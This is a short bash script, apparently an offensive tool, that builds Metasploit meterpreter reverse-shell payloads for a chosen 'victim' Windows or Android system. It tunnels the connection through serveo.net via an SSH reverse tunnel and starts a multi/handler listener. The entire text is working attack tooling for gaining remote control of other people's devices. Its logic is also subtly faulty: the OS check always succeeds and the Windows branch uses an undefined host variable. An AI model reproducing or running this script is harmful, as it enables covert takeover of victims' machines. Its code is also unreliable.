echo "      __               , _    
       /\_\/o    ()     /|/ \   
   _  |    |     /\  __  |   |  
 |/ \_|    ||   /  \/  \_|   |  
 |__/  \__/ |_//(__/\__/ |   |_/
/|                              
\|   The Simple WAN Payload Generator"
echo "Give me the victim operating system(windows/android)"
read o
echo "Give me the listening port(lport)"
read p
echo "What should be the name of your file??"
read n
echo "okay!! give me a second"
gnome-terminal -x ssh -R $p:localhost:$p serveo.net
if [ $o=='android' ]
 then
msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net lport=$p -o /root/Desktop/$n.apk
else 
msfvenom -p $o/meterpreter/reverse_tcp lhost=$l lport=$p -o /root/Desktop/$n.exe
fi
echo "Done!!! Check your Desktop for file HAPPY HACKING@@@"
echo "Wanna Start Listening(y/n)"
read a
if [ $a=='y' ] 
then
 msfconsole -x "use multi/handler;set payload $o/meterpreter/reverse_tcp;set lhost serveo.net;set lport $p;exploit"
fi
